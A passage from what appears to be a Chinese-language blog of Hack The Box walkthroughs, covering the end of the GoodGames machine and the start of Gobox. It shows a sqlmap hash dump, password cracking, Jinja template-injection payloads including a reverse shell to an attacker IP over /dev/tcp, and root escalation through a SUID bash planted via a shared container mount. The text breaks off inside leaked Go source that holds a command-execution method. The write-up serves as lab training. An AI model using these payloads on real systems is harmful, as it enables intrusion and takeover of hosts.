class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs bash">&gt;&gt; sqlmap -r /home/mosaictheory/GoodGames/payload.txt -D main -T user -C password --dump<br>Database: main<br>Table: user<br>[1 entry]<br>+----------------------------------+<br>| password                         |<br>+----------------------------------+<br>| 2b22337f218b2d82dfc3b6f77e7cb8ec |<br>+----------------------------------+<br></code></pre></td></tr></table></figure><p>我不知道是什么算法，但是john会自主识别：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><code class="hljs bash">&gt;&gt; john <span class="hljs-built_in">hash</span> -w=/usr/share/wordlists/rockyou.txt                <br>Warning: detected <span class="hljs-built_in">hash</span> <span class="hljs-built_in">type</span> <span class="hljs-string">&quot;LM&quot;</span>, but the string is also recognized as <span class="hljs-string">&quot;dynamic=md5(<span class="hljs-variable">$p</span>)&quot;</span><br>Use the <span class="hljs-string">&quot;--format=dynamic=md5(<span class="hljs-variable">$p</span>)&quot;</span> option to force loading these as that <span class="hljs-built_in">type</span> instead<br>Warning: detected <span class="hljs-built_in">hash</span> <span class="hljs-built_in">type</span> <span class="hljs-string">&quot;LM&quot;</span>, but the string is also recognized as <span class="hljs-string">&quot;HAVAL-128-4&quot;</span><br>Use the <span class="hljs-string">&quot;--format=HAVAL-128-4&quot;</span> option to force loading these as that <span class="hljs-built_in">type</span> instead<br>Warning: detected <span class="hljs-built_in">hash</span> <span class="hljs-built_in">type</span> <span class="hljs-string">&quot;LM&quot;</span>, but the string is also recognized as <span class="hljs-string">&quot;MD2&quot;</span><br>Use the <span class="hljs-string">&quot;--format=MD2&quot;</span> option to force loading these as that <span class="hljs-built_in">type</span> instead<br>Warning: detected <span class="hljs-built_in">hash</span> <span class="hljs-built_in">type</span> <span class="hljs-string">&quot;LM&quot;</span>, but the string is also recognized as <span class="hljs-string">&quot;mdc2&quot;</span><br>Use the <span class="hljs-string">&quot;--format=mdc2&quot;</span> option to force loading these as that <span class="hljs-built_in">type</span> instead<br>Warning: detected <span class="hljs-built_in">hash</span> <span class="hljs-built_in">type</span> <span class="hljs-string">&quot;LM&quot;</span>, but the string is also recognized as <span class="hljs-string">&quot;mscash&quot;</span><br>Use the <span class="hljs-string">&quot;--format=mscash&quot;</span> option to force loading these as that <span class="hljs-built_in">type</span> instead<br>Warning: detected <span class="hljs-built_in">hash</span> <span class="hljs-built_in">type</span> <span class="hljs-string">&quot;LM&quot;</span>, but the string is also recognized as <span class="hljs-string">&quot;mscash2&quot;</span><br>Use the <span class="hljs-string">&quot;--format=mscash2&quot;</span> option to force loading these as that <span class="hljs-built_in">type</span> instead<br>Warning: detected <span class="hljs-built_in">hash</span> <span class="hljs-built_in">type</span> <span class="hljs-string">&quot;LM&quot;</span>, but the string is also recognized as <span class="hljs-string">&quot;NT&quot;</span><br>Use the <span class="hljs-string">&quot;--format=NT&quot;</span> option to force loading these as that <span class="hljs-built_in">type</span> instead<br>Warning: detected <span class="hljs-built_in">hash</span> <span class="hljs-built_in">type</span> <span class="hljs-string">&quot;LM&quot;</span>, but the string is also recognized as <span class="hljs-string">&quot;Raw-MD4&quot;</span><br>Use the <span class="hljs-string">&quot;--format=Raw-MD4&quot;</span> option to force loading these as that <span class="hljs-built_in">type</span> instead<br>Warning: detected <span class="hljs-built_in">hash</span> <span class="hljs-built_in">type</span> <span class="hljs-string">&quot;LM&quot;</span>, but the string is also recognized as <span class="hljs-string">&quot;Raw-MD5&quot;</span><br>Use the <span class="hljs-string">&quot;--format=Raw-MD5&quot;</span> option to force loading these as that <span class="hljs-built_in">type</span> instead<br>Warning: detected <span class="hljs-built_in">hash</span> <span class="hljs-built_in">type</span> <span class="hljs-string">&quot;LM&quot;</span>, but the string is also recognized as <span class="hljs-string">&quot;Raw-MD5u&quot;</span><br>Use the <span class="hljs-string">&quot;--format=Raw-MD5u&quot;</span> option to force loading these as that <span class="hljs-built_in">type</span> instead<br>Warning: detected <span class="hljs-built_in">hash</span> <span class="hljs-built_in">type</span> <span class="hljs-string">&quot;LM&quot;</span>, but the string is also recognized as <span class="hljs-string">&quot;Raw-SHA1-AxCrypt&quot;</span><br>Use the <span class="hljs-string">&quot;--format=Raw-SHA1-AxCrypt&quot;</span> option to force loading these as that <span class="hljs-built_in">type</span> instead<br>Warning: detected <span class="hljs-built_in">hash</span> <span class="hljs-built_in">type</span> <span class="hljs-string">&quot;LM&quot;</span>, but the string is also recognized as <span class="hljs-string">&quot;ripemd-128&quot;</span><br>Use the <span class="hljs-string">&quot;--format=ripemd-128&quot;</span> option to force loading these as that <span class="hljs-built_in">type</span> instead<br>Warning: detected <span class="hljs-built_in">hash</span> <span class="hljs-built_in">type</span> <span class="hljs-string">&quot;LM&quot;</span>, but the string is also recognized as <span class="hljs-string">&quot;Snefru-128&quot;</span><br>Use the <span class="hljs-string">&quot;--format=Snefru-128&quot;</span> option to force loading these as that <span class="hljs-built_in">type</span> instead<br>Warning: detected <span class="hljs-built_in">hash</span> <span class="hljs-built_in">type</span> <span class="hljs-string">&quot;LM&quot;</span>, but the string is also recognized as <span class="hljs-string">&quot;ZipMonster&quot;</span><br>Use the <span class="hljs-string">&quot;--format=ZipMonster&quot;</span> option to force loading these as that <span class="hljs-built_in">type</span> instead<br>Using default input encoding: UTF-8<br>Using default target encoding: CP850<br>Loaded 2 password hashes with no different salts (LM [DES 256/256 AVX2])<br>Warning: poor OpenMP scalability <span class="hljs-keyword">for</span> this <span class="hljs-built_in">hash</span> <span class="hljs-built_in">type</span>, consider --fork=4<br>Will run 4 OpenMP threads<br>Press <span class="hljs-string">&#x27;q&#x27;</span> or Ctrl-C to abort, almost any other key <span class="hljs-keyword">for</span> status<br>0g 0:00:00:01 DONE (2022-05-14 16:21) 0g/s 6619Kp/s 6619Kc/s 13238KC/s !!1QWER..*7¡VA<br>Session completed. <br></code></pre></td></tr></table></figure><p>不过它似乎也不认识，但是谷歌帮我识别出来了，这还蛮意外的：</p><img src="https://raw.githubusercontent.com/Crazyinside/blog.image/main/Oldimage/image-20220514162303935.png" alt="image-20220514162303935"  /><p>我可以登录进去，并且在后台发现一个让我更改管理员名字的地方：</p><img src="https://raw.githubusercontent.com/Crazyinside/blog.image/main/Oldimage/image-20220514163039206.png" alt="image-20220514163039206"  /><h4 id="SSTI："><a href="#SSTI：" class="headerlink" title="SSTI："></a>SSTI：</h4><p>有可控参数，有回显，很明显的注入漏洞，XSS对我没什么意义，SQL注入我刚刚已经跑过了，那或许我能尝试一下SSTI，毕竟目标是个python环境：</p><img src="https://raw.githubusercontent.com/Crazyinside/blog.image/main/Oldimage/image-20220514164120410.png" alt="image-20220514164120410"  /><p>看起来可以，那么我可以试一下简单的payload：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">&#123;&#123; namespace.__init__.__globals__.os.popen(<span class="hljs-string">&#x27;id&#x27;</span>).<span class="hljs-built_in">read</span>() &#125;&#125;<br></code></pre></td></tr></table></figure><img src="https://raw.githubusercontent.com/Crazyinside/blog.image/main/Oldimage/image-20220514164613505.png" alt="image-20220514164613505"  /><p>它看起来还是root，我需要登录到目标会更方便一些，因为我还需要普通用户的flag，而我现在还不知道它是谁：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">&#123;&#123; namespace.__init__.__globals__.os.popen(<span class="hljs-string">&#x27;bash -c &quot;bash -i &gt;&amp; /dev/tcp/10.10.16.4/9001 0&gt;&amp;1&quot;&#x27;</span>).<span class="hljs-built_in">read</span>() &#125;&#125;<br></code></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs bash">&gt;&gt; nc -lvnp 9001<br>listening on [any] 9001 ...<br>connect to [10.10.16.4] from (UNKNOWN) [10.10.11.130] 45842<br>bash: cannot <span class="hljs-built_in">set</span> terminal process group (1): Inappropriate ioctl <span class="hljs-keyword">for</span> device<br>bash: no job control <span class="hljs-keyword">in</span> this shell<br>root@3a453ab39d3d:/backend<span class="hljs-comment"># ls</span><br><span class="hljs-built_in">ls</span><br>Dockerfile<br>project<br>requirements.txt<br>root@3a453ab39d3d:/backend<span class="hljs-comment"># </span><br></code></pre></td></tr></table></figure><h4 id="user-txt："><a href="#user-txt：" class="headerlink" title="user.txt："></a>user.txt：</h4><p>高兴的有点早，我还在一个Docker容器中，但它是有用户flag的：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs bash">root@3a453ab39d3d:/backend/project<span class="hljs-comment"># find / -name user.txt</span><br>/home/augustus/user.txt<br>root@3a453ab39d3d:/backend/project<span class="hljs-comment"># cat /home/augustus/user.txt </span><br>55f60c29f........................<br>root@3a453ab39d3d:/backend/project<span class="hljs-comment"># </span><br></code></pre></td></tr></table></figure><p>但我搜了其他东西半天没什么文件，但是在&#x2F;etc&#x2F;passwd文件中，并没有augustus这个用户：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs bash">root@3a453ab39d3d:/backend/project<span class="hljs-comment"># cat /etc/passwd</span><br>root:x:0:0:root:/root:/bin/bash<br>daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin<br>bin:x:2:2:bin:/bin:/usr/sbin/nologin<br>sys:x:3:3:sys:/dev:/usr/sbin/nologin<br><span class="hljs-built_in">sync</span>:x:4:65534:<span class="hljs-built_in">sync</span>:/bin:/bin/sync<br>games:x:5:60:games:/usr/games:/usr/sbin/nologin<br>man:x:6:12:man:/var/cache/man:/usr/sbin/nologin<br>lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin<br>mail:x:8:8:mail:/var/mail:/usr/sbin/nologin<br>news:x:9:9:news:/var/spool/news:/usr/sbin/nologin<br>uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin<br>proxy:x:13:13:proxy:/bin:/usr/sbin/nologin<br>www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin<br>backup:x:34:34:backup:/var/backups:/usr/sbin/nologin<br>list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin<br>irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin<br>gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin<br>nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin<br>_apt:x:100:65534::/nonexistent:/bin/false<br></code></pre></td></tr></table></figure><p>而且目标的IP，可能并不是我所想的一个IP一台机那么简单：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs bash">root@3a453ab39d3d:/backend/project<span class="hljs-comment"># ifconfig</span><br>eth0: flags=4163&lt;UP,BROADCAST,RUNNING,MULTICAST&gt;  mtu 1500<br>        inet 172.19.0.2  netmask 255.255.0.0  broadcast 172.19.255.255<br>        ether 02:42:ac:13:00:02  txqueuelen 0  (Ethernet)<br>        RX packets 3610  bytes 568033 (554.7 KiB)<br>        RX errors 0  dropped 0  overruns 0  frame 0<br>        TX packets 2975  bytes 4128083 (3.9 MiB)<br>        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0<br><br>lo: flags=73&lt;UP,LOOPBACK,RUNNING&gt;  mtu 65536<br>        inet 127.0.0.1  netmask 255.0.0.0<br>        loop  txqueuelen 1000  (Local Loopback)<br>        RX packets 0  bytes 0 (0.0 B)<br>        RX errors 0  dropped 0  overruns 0  frame 0<br>        TX packets 0  bytes 0 (0.0 B)<br>        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0<br></code></pre></td></tr></table></figure><p>我尝试扫描C段：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs bash">root@3a453ab39d3d:/backend/project<span class="hljs-comment"># for i in &#123;1..254&#125;; do (ping -c 1 172.19.0.$&#123;i&#125; | grep &quot;bytes from&quot; | grep -v &quot;Unreachable&quot; &amp;); done;</span><br>64 bytes from 172.19.0.1: icmp_seq=1 ttl=64 time=0.064 ms<br>64 bytes from 172.19.0.2: icmp_seq=1 ttl=64 time=0.027 ms<br></code></pre></td></tr></table></figure><p>可能会是目标C段的网关也说不准，反正它不是我在HTB的网关，是目标独有的，而我当前主机存在的用户目录augustus或许是作者故意挂载过来留给我的提示，或许我可以尝试对其进行探测：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs bash">root@3a453ab39d3d:~<span class="hljs-comment"># for port in &#123;1..65535&#125;; do echo &gt; /dev/tcp/172.19.0.1/$port &amp;&amp; echo &quot;$port open&quot;; done 2&gt;/dev/null</span><br>22 open<br>80 open<br></code></pre></td></tr></table></figure><p>它开着22，也开着80，尝试一下密码复用吧，毕竟我现在只有那一个密码：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs bash">root@3a453ab39d3d:~<span class="hljs-comment"># ssh augustus@172.19.0.1</span><br>The authenticity of host <span class="hljs-string">&#x27;172.19.0.1 (172.19.0.1)&#x27;</span> can<span class="hljs-string">&#x27;t be established.</span><br><span class="hljs-string">ECDSA key fingerprint is SHA256:AvB4qtTxSVcB0PuHwoPV42/LAJ9TlyPVbd7G6Igzmj0.</span><br><span class="hljs-string">Are you sure you want to continue connecting (yes/no)? yes</span><br><span class="hljs-string">Warning: Permanently added &#x27;</span>172.19.0.1<span class="hljs-string">&#x27; (ECDSA) to the list of known hosts.</span><br><span class="hljs-string">augustus@172.19.0.1&#x27;</span>s password: <br>Linux GoodGames 4.19.0-18-amd64 <span class="hljs-comment">#1 SMP Debian 4.19.208-1 (2021-09-29) x86_64</span><br><br>The programs included with the Debian GNU/Linux system are free software;<br>the exact distribution terms <span class="hljs-keyword">for</span> each program are described <span class="hljs-keyword">in</span> the<br>individual files <span class="hljs-keyword">in</span> /usr/share/doc/*/copyright.<br><br>Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent<br>permitted by applicable law. <br>augustus@GoodGames:~$ <span class="hljs-built_in">ls</span><br>user.txt<br>augustus@GoodGames:~$ <br></code></pre></td></tr></table></figure><h4 id="root-txt："><a href="#root-txt：" class="headerlink" title="root.txt："></a>root.txt：</h4><p>看起来我猜的没错，但是竟然没有sudo：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash">augustus@GoodGames:~$ sudo -l<br>bash: sudo: <span class="hljs-built_in">command</span> not found<br></code></pre></td></tr></table></figure><p>容器与当前目录是一样的，并且他们是互通的：</p><p><img src="https://raw.githubusercontent.com/Crazyinside/blog.image/main/Oldimage/image-20220514172943695.png" alt="image-20220514172943695"></p><p>我可以尝试CP一个root权限的bash到当前目录下:</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">augustus@GoodGames:~$ <span class="hljs-built_in">cp</span> /bin/bash .<br></code></pre></td></tr></table></figure><p>然后借助容器中的root用户为其做SUID:</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs bash">root@3a453ab39d3d:/home/augustus<span class="hljs-comment"># chown root:root bash</span><br>root@3a453ab39d3d:/home/augustus<span class="hljs-comment"># chmod 4777 bash</span><br>root@3a453ab39d3d:/home/augustus<span class="hljs-comment"># </span><br></code></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs bash">augustus@GoodGames:~$ <span class="hljs-built_in">ls</span> -all<br>total 1236<br>drwxr-xr-x 3 augustus augustus    4096 May 14 10:52 .<br>drwxr-xr-x 3 root     root        4096 Oct 19  2021 ..<br>-rwsrwxrwx 1 root     root     1234376 May 14 10:52 bash<br>lrwxrwxrwx 1 root     root           9 Nov  3  2021 .bash_history -&gt; /dev/null<br>-rw-r--r-- 1 augustus augustus     220 Oct 19  2021 .bash_logout<br>-rw-r--r-- 1 augustus augustus    3526 Oct 19  2021 .bashrc<br>-rw-r--r-- 1 augustus augustus     807 Oct 19  2021 .profile<br>drwxr-xr-x 2 augustus augustus    4096 May 14 10:29 <span class="hljs-built_in">test</span><br>-rw-r----- 1 root     augustus      33 May 14 07:02 user.txt<br></code></pre></td></tr></table></figure><p>然后启动当前目录下的bash：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs bash">augustus@GoodGames:~$ ./bash -p<br>bash-5.1<span class="hljs-comment"># whoami</span><br>root<br>bash-5.1<span class="hljs-comment"># cat /root/root.txt </span><br>76b01..........................<br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>Hack The Box</category>
      
    </categories>
    
    
    <tags>
      
      <tag>Linux</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>HTB Walkthrough - Gobox</title>
    <link href="/post/HackTheBox-Gobox.html"/>
    <url>/post/HackTheBox-Gobox.html</url>
    
    <content type="html"><![CDATA[<p><img src="https://raw.githubusercontent.com/Crazyinside/blog.image/main/Oldimage/Gobox.png" alt="Gobox"></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><code class="hljs bash">Crazy:~/HackThebox$ sudo masscan -p1-65535,U:1-65535 --rate 2000 -e tun0 10.10.11.113<br>Starting masscan 1.3.2 (http://bit.ly/14GZzcT) at 2022-08-22 12:37:14 GMT<br>Initiating SYN Stealth Scan<br>Scanning 1 hosts [131070 ports/host]<br>Discovered open port 80/tcp on 10.10.11.113                                    <br>Discovered open port 22/tcp on 10.10.11.113                                    <br>Discovered open port 4566/tcp on 10.10.11.113                                  <br>Discovered open port 8080/tcp on 10.10.11.113        <br>Crazy:~/HackThebox$ curl -I 10.10.11.113              <br>HTTP/1.1 200 OK<br>Server: nginx<br>Date: Mon, 22 Aug 2022 12:38:47 GMT<br>Content-Type: text/html; charset=UTF-8<br>Connection: keep-alive<br>Crazy:~/HackThebox$ sudo nmap -sC -sV 10.10.11.113 -p80,22,4566,8080 -oN Goboxs        <br>[sudo] crazyinside 的密码：<br>Starting Nmap 7.92SVN ( https://ParrotOS.org ) at 2022-08-22 20:39 CST<br>Nmap scan report <span class="hljs-keyword">for</span> 10.10.11.113<br>Host is up (0.11s latency).<br><br>PORT     STATE SERVICE VERSION<br>22/tcp   open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)<br>| ssh-hostkey: <br>|   3072 d8f5efd2d3f98dadc6cf24859426ef7a (RSA)<br>|   256 463d6bcba819eb6ad06886948673e172 (ECDSA)<br>|_  256 7032d7e377c14acf472adee5087af87a (ED25519)<br>80/tcp   open  http    nginx<br>|_http-title: Hacking eSports | &#123;&#123;.Title&#125;&#125;<br>4566/tcp open  http    nginx<br>|_http-title: 403 Forbidden<br>8080/tcp open  http    nginx<br>|_http-title: Hacking eSports | Home page<br>Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel<br><br>Service detection performed. Please report any incorrect results at https://ParrotOS.org/submit/ .<br>Nmap <span class="hljs-keyword">done</span>: 1 IP address (1 host up) scanned <span class="hljs-keyword">in</span> 16.94 seconds<br>zsh: segmentation fault  sudo nmap -sC -sV 10.10.11.113 -p80,22,4566,8080 -oN Goboxs<br></code></pre></td></tr></table></figure><p>80页面没什么东西。一直到8080端口，火狐有些样式识别不出来，懂得都懂。在忘记密码页面尝试提交一个邮箱地址，会提示邮箱成功发送，抓包查看：</p><p><img src="https://raw.githubusercontent.com/Crazyinside/blog.image/main/Oldimage/image-20220822210008678.png" alt="image-20220822210008678"></p><p>介于XSS在此并没有什么实质性的帮助，所以考虑SSTI。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs bash">Crazy:~/HackThebox$ curl -I 10.10.11.113:8080<br>HTTP/1.1 200 OK<br>Server: nginx<br>Date: Mon, 22 Aug 2022 13:00:53 GMT<br>Connection: keep-alive<br>X-Forwarded-Server: golang<br></code></pre></td></tr></table></figure><p>Golang环境。</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">https:<span class="hljs-regexp">//</span>blog.takemyhand.xyz<span class="hljs-regexp">/2020/</span><span class="hljs-number">05</span>/ssti-breaking-gos-template-engine-to.html<br></code></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/Crazyinside/blog.image/main/Oldimage/image-20220822210218108.png" alt="image-20220822210218108"></p><p><img src="https://raw.githubusercontent.com/Crazyinside/blog.image/main/Oldimage/image-20220822210357885.png" alt="image-20220822210357885"></p><p>像是一组口令凭证。可以登录，但是登录就变成了这样：</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br></pre></td><td class="code"><pre><code class="hljs go"><br><span class="hljs-keyword">package</span> main<br><br><span class="hljs-keyword">import</span>(<br>    <span class="hljs-string">&quot;html/template&quot;</span><br>    <span class="hljs-string">&quot;net/http&quot;</span><br>    <span class="hljs-string">&quot;log&quot;</span><br>    <span class="hljs-string">&quot;os/exec&quot;</span><br>    <span class="hljs-string">&quot;fmt&quot;</span><br>    <span class="hljs-string">&quot;bytes&quot;</span><br>    <span class="hljs-string">&quot;strings&quot;</span><br>)<br><br><span class="hljs-comment">// compile all templates and cache them</span><br><span class="hljs-keyword">var</span> templates = template.Must(template.ParseGlob(<span class="hljs-string">&quot;templates/*&quot;</span>))<br><br><span class="hljs-keyword">type</span> Data <span class="hljs-keyword">struct</span> &#123;<br>    Title <span class="hljs-type">string</span> <span class="hljs-comment">// Must be exported!</span><br>    Body <span class="hljs-type">string</span>  <span class="hljs-comment">// Must be exported!</span><br>&#125;<br><br><span class="hljs-keyword">type</span> User <span class="hljs-keyword">struct</span> &#123;<br>        ID       <span class="hljs-type">int</span><br>        Email    <span class="hljs-type">string</span><br>        Password <span class="hljs-type">string</span><br>&#125;<br><br><br><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-params">(u User)</span></span> DebugCmd (test <span class="hljs-type">string</span>) <span class="hljs-type">string</span> &#123;<br>  ipp := strings.Split(test, <span class="hljs-string">&quot; &quot;</span>)<br>  bin := strings.Join(ipp[:<span class="hljs-number">1</span>], <span class="hljs-string">&quot; &quot;</span>)<br>  args := strings.Join(ipp[<span class="hljs-number">1</span>:], <span class="hljs-string">&quot; &quot;</span>)<br>  <span class="hljs-keyword">if</span> <span class="hljs-built_in">len</span>(args) &gt; <span class="hljs-number">0</span>&#123;<br>    out, _ := exec.Command(bin, args).CombinedOutput()<br>    <span class="hljs-keyword">return</span> <span class="hljs-type">string</span>(out)<br>  &#125; <span class="hljs-keyword">else</span> &#123;<br>    out, _ := exec.Command(bin).CombinedOutput()<br>    <span class="hljs-keyword">return</span> <span class="hljs-type">string</span>(out)<br>  &#125;<br>&#125;<br><br><span class="hljs-comment">// Renders the templates</span><br><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">renderTemplate</span><span class="hljs-params">(w http.ResponseWriter, tmpl <span class="hljs-type">string</span>, page *Data)</span></span> &#123;<br>err := templates.ExecuteTemplate(w, tmpl, page)<br><span class="hljs-keyword">if</span> err != <span class="hljs-literal">nil</span> &#123;<br>    http.Error(w, err.Error(), http.StatusInternalServerError)<br>    <span class="hljs-keyword">return</span><br>&#125;<br>&#125;<br><br><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">IndexHandler</span><span class="hljs-params">(w http.ResponseWriter, r *http.Request)</span></span> &#123;<br>  <span class="hljs-keyword">switch</span> r.Method &#123;<br>  <span class="hljs-keyword">case</span> <span class="hljs-string">&quot;GET&quot;</span>:<br>page := &amp;Data&#123;Title:<span 